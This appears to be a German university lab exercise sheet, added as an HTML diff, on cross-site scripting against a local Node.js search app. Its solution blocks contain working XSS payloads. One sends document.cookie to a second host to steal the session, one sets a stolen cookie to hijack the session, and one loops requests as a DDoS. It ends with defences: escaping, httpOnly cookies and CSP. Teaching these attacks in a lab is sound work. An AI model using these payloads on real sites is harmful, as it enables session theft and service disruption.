@@ -1,0 +1,348 @@
+<!doctype html>
+<html lang="de">
+	<head>
+		<meta charset="utf-8" />
+		<title>WED2 - Web Security: Übung XSS</title>
+		<link rel="icon" href="../HSR.Template.Exercises/icon-document.png" type="image/png">
+
+		<link rel="stylesheet" type="text/css" href="../HSR.Template.Exercises/documentStyle.css" />
+		<script src="../HSR.Template.Exercises/solutions.js"></script>
+		<script src="https://cdn.rawgit.com/google/code-prettify/master/loader/run_prettify.js"></script>
+	</head>
+	<body>
+		<h1>
+			<a class="backlink" href="../index.html">⇦</a>
+			WED2 - Web Security: Übung XSS
+			<button id="showSolutions">Lösungen anzeigen/ausblenden</button>
+		</h1>
+
+
+		<p style="background: maroon; color: white; padding: 1rem;">
+			Verwenden Sie gelerntes Wissen aus dieser Übung nicht zum Fahren von Angriffen gegen externe Systeme oder Systeme der HSR!<br />
+			<strong>Das Angreifen von Systemen ist in der Schweiz ein <a style="color: silver;" href="http://www.vermoegensdelikte.ch/computerdelikte" target="_blank">Delikt</a>
+			und die Administratoren der HSR verstehen keinen Spass!</strong><br />
+			Sie bewegen sich nicht anonym im Netz. Aufgrund der Identifikation im Netzwerk können Verursacher von Angriffen leicht festgestellt werden.
+		</p>
+
+
+		<h2>Theorie (max 10min)</h2>
+		<p>
+			Sie haben in der Vorlesung die Grundlagen von Cross-Site-Scripting (XSS) gehört.
+			Wenn Sie die Inhalte nochmals repetieren möchten, sehen sie sich folgendes Video (Von Minute 1:24 bis Minute 8:00) von OWASP an:
+		</p>
+		<iframe width="560" height="315" src="https://www.youtube.com/embed/_Z9RQSnf8-g" frameborder="0" allowfullscreen></iframe>
+
+
+		<h2>Hinweise</h2>
+
+		<h3>events.js:72</h3>
+		<p>Falls Sie beim Starten der Node.js-Server folgende Fehlermeldung erhalten, überprüfen Sie, ob nicht bereits ein anderer Prozess den gleichen Port benutzt.
+			Alternativ können Sie die Port-Variable im Server-Code ändern.
+			<pre><code><!--
+-->events.js:72
+    throw er; // Unhandled 'error' event
+          ^
+Error: listen EADDRINUSE
+    at errnoException (net.js:901:11)
+    at Server._listen2 (net.js:1039:14)
+    at listen (net.js:1061:10)
+    at Server.listen (net.js:1127:5)
+    at EventEmitter.app.listen (C:\Temp\U\U10.1-XSS\node_modules\express\lib\application.js:595:24)
+    at Object.<anonymous> (C:\Temp\U\U10.1-XSS\gitHub.js:22:18)
+    at Module._compile (module.js:456:26)
+    at Object.Module._extensions..js (module.js:474:10)
+    at Module.load (module.js:356:32)
+    at Function.Module._load (module.js:312:12)<!--
+	--></code></pre>
+		</p>
+
+		<h3>Chrome &amp; XSS</h3>
+		<p>Chrome besitzt eine Erkennung für Cross-Site-Scripting. Sie werden beim Abschicken von Einträgen mit XSS-Verletzung eine Warnung in der Konsole erhalten.
+			Laden Sie anschliessend neu, funktioniert der Angriff jedoch wie vorgesehen, da Chrome nun Request und Response nicht mehr matchen kann.
+		</p>
+
+
+		<h2>Hintergrundinformationen</h2>
+		<p>
+			Cross-Site-Scripting wird am häufigsten benutzt, um Login Daten zu stehlen. Doch XSS kann auch für eine ganze Reihe anderer Angriffe benutzt werden.
+			Anfang März 2015 wurde <strong>GitHub</strong> Opfer einer <strong>DDoS</strong> Attacke (<a href="http://www.heise.de/newsticker/meldung/Github-wehrt-sich-gegen-gross-angelegte-DDoS-Attacke-2587869.html?wt_mc=rss.ho.beitrag.atom" target="_blank">heise.de: Github wehrt sich gegen groß angelegte DDoS-Attacke</a>).<br />
+			Bei einer DoS-Attacke (<a href="http://de.wikipedia.org/wiki/Denial_of_Service" target="_blank">Denial of Service</a>) überhäufen Angreifer eine Seite mit Anfragen, bis der zugrunde liegende Webserver zusammenbricht.
+			Um zu verhindern, das Administratoren eine solche Attacke mittels Firewall-Regeln ausbremsen, werden DoS-Attacken normalerweise von verschiedenen Rechnern aus gefahren (Distributed &rarr; DDos).
+			Für eine solche Attacke benutzt ein Angreifer normalerweiser ein Bot-Netz. Also eine Gruppe von gehackten Computern, verteilt über die Welt, die aus der Ferne für die Angriffe benutzt werden.
+			Anstelle eines Bot-Netzes haben die Angreifer bei der Attacke auf GitHub die Benutzer der chinesischen Suchmaschine Baidu eingespannt, indem sie den Usern falsche JavaScripte untergeschoben haben.
+		<p>
+
+
+		<h2>Aufgabe A - XSS Grundlagen (10 min)</h2>
+		<p><strong>Führen Sie diese Übung zu zweit durch.</strong></p>
+		<p>
+			Wir nehmen an, Baidu weisst eine XSS Lücke auf, wobei Eingaben im Suchfeld ungefiltert ander Benutzern als &quot;Ähnliche Suchanfragen&quot; aufgelistet wurden.
+			Setzen Sie sich zu zweit zusammen und skizzieren Sie, welche Schritte ein Angreifer unternehmen muss,
+			um Benutzern ein Skript unterzujubeln, wie dieses Skript beim Benutzer geladen wird und wie dieses Skript anschliessend GitHub aufruft (Mehrere Möglichkeiten).
+		</p>
+
+		<div class="solution">
+			<ul>
+				<li>Der Angreifer muss ein entsprechendes Script-Snippet in das Suchfeld eingeben.
+					<pre class="prettyprint"><code class="language-html" style="background: white;"><!--
+						-->Facebook &lt;script&gt;do something evil...&lt;/script&gt;<!--
+					--></code></pre>
+					Jeder Benutzer, der nun nach &quot;Facebook&quot; sucht, erhält diesen Code in der Liste mit den ähnliche Suchanfragen aufgelistet.
+					Da das Script Tag nicht sichtbar ist, ist der Angriff für den Benutzer unsichtbar.
+				</li>
+				<li>Das Script des Angreifers lädt nun ein Element von GitHub nach. Dies kann z.B. geschehen, indem das Script ein entsprechendes Bild, Video, Iframe etc. in die Seite einfügt:
+					<pre class="prettyprint"><code class="language-html" style="background: white;"><!--
+						-->&lt;img src="http://github.com/..." /&gt;<!--
+					--></code></pre>
+				</li>
+				<li>
+					Jeder Benutzer dieses Suchresultates ruft nun unbewusst im Hintergrund GitHub auf. Im schlechtesten Fall steckt hinter der URL auf GitHub eine nicht-cachbare Seite,
+					sodas der Webserver von GitHub jedes Mal die Seite neuberechnen muss. Ein Beispiel hierfür sind Fehlerseiten (404).
+				</li>
+				<li>
+					Da die Requests von tausenden verschiedenen Clients kommen, können die Administratoren von GitHub keine Filter-Regel für einzelne Hosts oder IP Ranges erlassen,
+					ohne alle chinesischen Benutzer auch gleich von GitHub auszusperren.
+				</li>
+			</ul>
+		</div>
+
+
+		<h2>Aufgabe B - Cookie stehlen (25min)</h2>
+		<p><strong>Führen Sie diese Übung zu zweit durch.</strong></p>
+		<p>
+			Das Stehlen von Session Cookies ist eine der klassischen Angriffe bei XSS. Mittels dem gestohlenen Cookie kann ein Angreifer in einer Web Applikation die Session eines Benutzers übernehmen
+			und damit unter seinem Account agieren. Beispiel E-Banking Applikation: Der Angreifer kann sich somit als den Benutzer ausgeben und Zahlungen tätigen.
+		</p>
+		<p>In unserem Beispiel gehen wir von einer Suchapplikation einer Socialmediaseite aus. Nehmen Sie an, es handelt sich um eingeloggte Benutzer.</p>
+
+		<ol>
+			<li>
+				Öffnen Sie eine Shell, wechseln Sie ins Verzeichnis &quot;server&quot; und installieren Sie die Abhängigkeiten mittels npm und dem enthaltenen Package-File:
+				<pre><code>npm install</code></pre>
+			</li>
+			<li>Starten Sie die Suchapp mittels <pre><code>node superSearch.js</code></pre>
+				auf ihrem Rechner und öffnen Sie die App im Browser: <a href="http://localhost:8080" target="_blank">http://localhost:8080</a></li>
+			<li>Ihr Kollege startet auf seinem Rechner unser Mini-GitHub<pre><code>node gitHub.js</code></pre> und öffnet die Seite in seinem Browser:
+				<a href="http://localhost:8081" target="_blank">http://localhost:8081</a></li>
+			<li>
+				Lassen Sie ihren Kollegen eine Suchanfrage machen, indem er auf ihre Applikation zugreift: <a href="http://{ihre IP}:8080">http://{ihre IP}:8080</a></pre>
+				Ihre IP Adresse können Sie unter Windows <pre><code>ipconfig /all</code></pre> und unter Linux mittels <pre><code>ifconfig</code></pre> ermitteln.
+			</li>
+			<li>Machen Sie eine Suchanfrage, sodas ihr Kollege beim Neuladen eine Dialogmeldung angezeigt erhält (Alert).
+
+				<div class="solution">
+					<pre class="prettyprint"><code class="language-html" style="background: white;"><!--
+					-->Hi there &lt;script&gt;alert('You are hacked!');&lt;/script&gt;<!--
+					--></code></pre>
+				</div>
+			</li>
+			<li>
+				Machen Sie nun eine Suchanfrage, sodass beim Neuladen bei ihrem Kollegen eine Anfrage auf das Mini-GitHub ausgeführt wird:
+				<a href="http://{IP ihres Kollegen}:8081">http://{IP ihres Kollegen}:8081</a></pre>
+				Das Mini-GitHub besitzt einen Counter, der bei jedem Request erhöht wird. Anhand dessen Ausgabe auf der Konsole oder im Browser sehen Sie, wenn der Request geklappt hat.<br />
+				<strong class="tipp" title="Indem Sie ein Bild oder ein Iframe einfügen, können Sie einen Request erzeugen.">Tipp</strong>
+
+				<div class="solution">
+					<pre class="prettyprint"><code class="language-html" style="background: white;"><!--
+					-->Hi there &lt;img src="http://{IP ihres Mini-GitHub Hostes}:8081/"  /&gt;<!--
+					--></code></pre>
+					<p>or</p>
+					<pre class="prettyprint"><code class="language-html" style="background: white;"><!--
+					-->Hi there &lt;iframe src="http://{IP ihres Mini-GitHub Hostes}:8081/" &gt;&lt;/iframe&gt;<!--
+					--></code></pre>
+				</div>
+			</li>
+			<li>
+				Loggen sie sich ein vor dem Suchen. Bauen Sie nun ihren Eintrag aus und liefern sie dem Mini-GitHub das Session Cookie des Benutzers. Sie können das Cookie als Parameter dem Mini-GitHub übergeben:
+				<a href="http://{IP ihres Kollegen}:8081/?cookie={das ausgelesene Cookie}">http://{IP ihres Kollegen}:8081/?cookie={das ausgelesene Cookie}</a></pre>.
+				Das Mini-GitHub wird das Cookie auf der Konsole ausgeben.<br />
+				<strong class="tipp" title="Das Cookie können Sie mit &quot;document.cookie&quot; abfragen.
+Sie müssen das Cookie noch escapen mit escape(), damit sie es in die URL einfügen können.
+Fügen Sie ein Bild oder ein Iframe ein und setzen Sie anschliessend mit Javascript die Source. Dann können Sie das Cookie als Parameter mitgeben.">Tipp</strong>
+
+				<div class="solution">
+					<pre class="prettyprint"><code class="language-html" style="background: white;"><!--
+					-->Hi there. &lt;img id="dummyPic" /&gt;<!--
+					-->&lt;script&gt;document.getElementById('dummyPic').src='http://{IP ihres Mini-GitHub Hostes}:8081/?cookie='+escape(document.cookie);&lt;/script&gt;<!--
+					--></code></pre>
+					<p>Auf der Node Konsole des Mini-GitHub wird das Cookie ausgegeben:</p>
+					<pre><code style="background: black; color: lightgreen;">cookie: connect.sid=s%3ASJfocugVGVBEop8uGvP3sRso-F2jCNmM.Ov5gE7MnE7caZWJgNSvJfwajYwcYW655LY9U7vsFLlg</code></pre>
+				</div>
+			</li>
+			<li>Wie müsste ein Angreifer vorgehen, um mit dem gestohlenen Cookie die Session des Benutzers übernehmen zu können?
+				<div class="solution">
+					<p>
+						Der Angreifer müsste das Cookie unescapen und bei sich im Browser setzen.
+						Lädt der Angreifer anschliessend die Seite neu, ist er eingeloggt und kommt an die persönlichen Informationen des Benutzers,
+						da er automatisch alle Rechte hat, die der ursprüngliche Benutzer hatte.
+					</p>
+					<pre class="prettyprint"><code class="language-javascript" style="background: white;"><!--
+					-->document.cookie = unescape('connect.sid=s%3AZF...');<!--
+					--></code></pre>
+					<p>
+						Der Server ordnet Client und Server Session anhand der Cookie SID zu. Diese wird so generiert, das sie nicht erraten werden kann.
+						Kennt jedoch jemand diese SID (wie im Falle eines Cookie Diebstahls), so kann er die Session übernehmen.
+					</p>
+				</div>
+			</li>
+		</ol>
+
+
+		<h2><img data-type="icon-difficult" src="../HSR.Template.Exercises/mind.svg" />  Aufgabe C - XSS-DDoS Attacke (15min)</h2>
+		<p><strong>Führen Sie diese Übung zu zweit durch.</strong></p>
+		<ol>
+			<li>
+				Benutzen Sie den Aufbau von Aufgabe B. Ergänzen Sie ihre Suchanfrage aus Aufgabe B,
+				sodass in regelmässigen Zeitabständen (100ms) Anfragen an das Mini-GitHub gerichtet werden. Benutzen Sie dazu setTimeout().
+			</li>
+			<li>
+				Schicken Sie diese Suchanfrage 10 Mal ab (Falls ihre Lösung mit ID's funktioniert beachten Sie, das sie nur ein Element mit der gleichen ID anlegen &rarr; ID's sollten unique sein)
+				und bitten Sie anschliessend einige Kollegen, ihr Gästebuch aufzurufen.
+				Ihr Kollege kann nun beobachten, wie der Counter im Mini-GitHub in die Höhe schnellt.
+				Welche Problematik stellt sich hier insbesonder bei Node.js ein, das nur einen Thread zum Abarbeiten von Requests kennt?
+			</li>
+		</ol>
+		<div class="solution">
+			<pre class="prettyprint"><code class="language-html" style="background: white;"><!--
+			-->Hi there. &lt;img id="dummyPic" /&gt;<!--
+			-->&lt;script&gt;function loadPic() { document.getElementById('dummyPic').src='http://{IP ihres Mini-GitHub Hostes}:8081'; setTimeout(loadPic, 100); } loadPic();&lt;/script&gt;<!--
+			--></code></pre>
+			<p>Da Node.js kein Multi-Threading besitzt, kann es nur einen Request gleichzeitig abarbeiten. Wird der Node.js Server überlastet durch zu viele Anfragen,
+				so blockieren weitere Anfragen, bis der Server die vorhergehenden abgearbeitet hat.
+			</p>
+		</div>
+
+
+		<h2>Aufgabe D - Applikation schützen (20min)</h2>
+		<ol>
+			<li>Sehen Sie sich den Code der SuperSearch Applikation und deren Template an (<a href="superSearch.js" target="_blank">superSearch.js</a>) und machen Sie zwei Vorschläge, wie die Applikation gegen XSS abzusichern ist (Ausgenommen CSP).
+
+				<div class="solution">
+					<p><strong>Escaping</strong> (Mögliche Lösungen):</p>
+					<ul>
+						<li>
+							Suchbegriffe, die problematische Zeichen enthalten nicht abspeichern:
+							<pre class="prettyprint"><code class="language-javascript" style="background: white;"><span style="opacity: 0.25;"><!--
+-->// superSearch.js
+// ...
+app.post('/', function (request, response) {
+	var context = {
+		layout: false,
+		title: 'Super social search',
+		searches: searches
+	};
+	if(request.body.message && request.body.message != '' </span>&& request.body.message.indexOf('<') === -1 && request.body.message.indexOf('>') === -1 && ...<span style="opacity: 0.25;">) {
+		context.lastSearch = request.body.search;
+		searches.push(request.body.search);
+	}
+	context.hasSearches = searches.length > 0;
+	response.render('search', context);
+});
+// ...
+</span><!--
+							--></code></pre>
+						</li>
+						<li>Escapen der Suchbegriffe vor dem Abspeichern:
+							<pre class="prettyprint"><code class="language-javascript" style="background: white;"><span style="opacity: 0.25;"><!--
+-->// superSearch.js
+// ...
+app.post('/', function (request, response) {
+	var context = {
+		layout: false,
+		title: 'Super social search',
+		searches: searches
+	};
+	if(request.body.message && request.body.message != '') {</span>
+		// myEscapeFunction will replace <, / and >
+		var escapedSearchString = myEscapeFunction(request.body.search);
+		context.lastSearch = escapedSearchString;
+		searches.push(escapedSearchString);<span style="opacity: 0.25;">
+	}
+	context.hasSearches = searches.length > 0;
+	response.render('search', context);
+});
+// ...
+</span><!--
+							--></code></pre>
+						</li>
+						<li><strong>Bevorzugte Lösung</strong>: Escapen der Suchbegriffe vor der Ausgabe durch das Templating-Framework:
+							<pre class="prettyprint"><code class="language-handlebars" style="background: white;"><span style="opacity: 0.25;"><!--
+-->//- views/search.handlebars
+&lt;-- ... --&gt;
+{{#if hasSearches}}
+	&lt;div&gt;
+		&lt;h2&gt;Last searches&lt;/h2&gt;
+		&lt;ul>
+			{{#each searches}}</span>
+				&lt;!--
+					'{{{...}}}' is used to output raw content (containing html tags)
+					Usage of '{{...}}' instead of '{{{...}}}' will escape variable content
+				--&gt;
+				&lt;li&gt;{{this}}&lt;/li&gt;<span style="opacity: 0.25;">
+			{{/each}}
+		&lt;/ul&gt;
+	&lt;/div&gt;
+{{/if}}
+&lt;-- ... --&gt;<!--
+							--></code></pre>
+							<p>Dies ist die beste Lösung. Aufgaben solcher Art sollten Sie wann immer möglich einem Framework überlassen und nicht selbst implementiert werden, da die Gefahr zu gross ist,
+								das ihre Lösung wiederum Lücken enthält.</p>
+						</li>
+						<li><strong>HTTP-Only Cookie</strong>: Verhindern, das das Cookie mittels JS ausgelesen werden kann
+								<a href="http://cdn.oreillystatic.com/en/assets/1/event/106/Top%20Overlooked%20Security%20Threats%20To%20Node_js%20Web%20Applications%20Presentation%201.pdf#page=28" target="_blank">Top (Overlooked Security Threats To Node_js Web Applications Presentation - Cookie)</a>:
+							<pre class="prettyprint"><code class="language-javascript" style="background: white;"><span style="opacity: 0.25;"><!--
+-->// superSearch.js
+var express	= require("express");
+var bodyParser = require('body-parser');
+var session = require('express-session');
+var expressHandlebars = require('express-handlebars');
+
+var app = express();
+app.use(bodyParser.urlencoded({ extended: true }));
+app.use(session({ cookie: { </span>httpOnly: true, <span style="opacity: 0.25;">saveUninitialized: true, resave: true }, secret: 'gh45sdfgh5asd45df' }));
+// ...
+</span><!--
+							--></code></pre>
+						</li>
+					</ul>
+					<p>
+						Um einen wirksamen Schutz zu garantieren, sollten <strong>mehrere Massnahmen angewendet</strong> werden.<br />
+						HTTP-Only Cookie und Escaping durch die Template Engine sollten immer wenn möglich benutzt werden,
+						auch wenn in einer Applikation keine Benutzer-Inputs verarbeitet werden. So kann verhindert werden,
+						das später durch hinzufügen von Funktionen Sicherheitslöcher eingebaut werden.<br />
+						Nicht erlaubte Anfragen von vornherein abzuweisen ist ebenfalls eine gute zusätzliche Massnahme.
+					</p>
+				</div>
+			</li>
+			<li>Ergänzen Sie die Node Applikation der Supersearch um eine CSP (Content Security Policy), die nur Scripte der eigenen Domain zulässt und Inline-Scripte unterbindet.
+				Nutzen Sie dazu die Bibliothek &quot;helmet&quot;.
+
+				<div class="solution">
+					<pre class="prettyprint"><code class="language-javascript" style="background: white;"><span style="opacity: 0.25;"><!--
+-->// superSearch.js
+var express	= require("express");
+var bodyParser = require('body-parser');
+var session = require('express-session');
+var expressHandlebars = require('express-handlebars');
+</span>var helmet = require('helmet');<span style="opacity: 0.25;">
+
+var app = express();</span>
+app.use(helmet.contentSecurityPolicy({
+  defaultSrc: ["'self'"],
+}));<span style="opacity: 0.25;">
+app.use(bodyParser.urlencoded({ extended: true }));
+// ...
+</span><!--
+					--></code></pre>
+					<p>Dies erzeugt folgenden HTTP Header:</p>
+					<pre class="prettyprint"><code class="language-http" style="background: white;">content-security-policy: &quot;default-src 'self'&quot;</pre></code>
+					<p>Sie sehen diesen Header, wenn Sie in den Entwicklertools in die Netzwerkansicht wechseln und dort die Details zu einem Request anzeigen lassen.
+					(Sie müssen in die Netzwerkansicht wechseln und dann das Gästebuch neuladen, ansonsten sehen Sie keine Requests.)</p>
+					<p>Enthält nun eine Suchabfrage ein Inline-Script, so wird dieses vom Browser blockiert, was sie mit der folgenden Fehlermeldung in der Console sehen:
+						<pre style="background: rgb(86, 66, 80); color: rgb(135, 158, 154); border-left: 5px solid rgb(236, 30, 13);"><span style="color: rgb(236, 30, 13); font-weight: bold;">&Cross;</span> Content Security Policy: The page’s settings blocked the loading of a resource at self (“default-src http://localhost:8080”).</pre>
+					</p>
+				</div>
+			</li>
+		</ol>
+  </body>
+</html>
